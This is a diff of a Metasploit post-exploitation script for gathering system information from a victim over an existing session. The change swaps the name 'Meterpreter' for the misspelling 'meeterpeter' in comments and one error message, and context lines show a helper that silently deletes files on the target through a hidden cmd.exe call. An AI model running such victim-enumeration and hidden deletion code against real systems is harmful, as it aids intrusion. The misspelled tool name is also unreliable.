@@ -1,15 +1,15 @@
 ##
-# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# WARNING: Metasploit no longer maintains or accepts meeterpeter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
 
 
-# This is a Meterpreter script designed to be used by the Metasploit Framework
+# This is a meeterpeter script designed to be used by the Metasploit Framework
 #
 # The goal of this script is to obtain system information from a victim through
-# an existing Meterpreter session. This is only a simple example of what can
-# be accomplished through Meterpreter scripting.
+# an existing meeterpeter session. This is only a simple example of what can
+# be accomplished through meeterpeter scripting.
 #
 # hdm[at]metasploit.com
 #
@@ -33,7 +33,7 @@ require 'fileutils'
 # Some of this script was developed in conjunction with _MAX_ (max[at]remote-exploit.org)
 # The complete version will be released in the future as 'autometer'
 
-# Delete a file (meterpreter has no unlink API yet)
+# Delete a file (meeterpeter has no unlink API yet)
 def m_unlink(client, path)
   r = client.sys.process.execute("cmd.exe /c del /F /S /Q " + path, nil, {'Hidden' => 'true'})
   while(r.name)
@@ -42,7 +42,7 @@ def m_unlink(client, path)
   r.close
 end
 def unsupported
-  print_error("This version of Meterpreter is not supported with this Script!")
+  print_error("This version of meeterpeter is not supported with this Script!")
   raise Rex::Script::Completed
 end
 # Exec a command and return the results
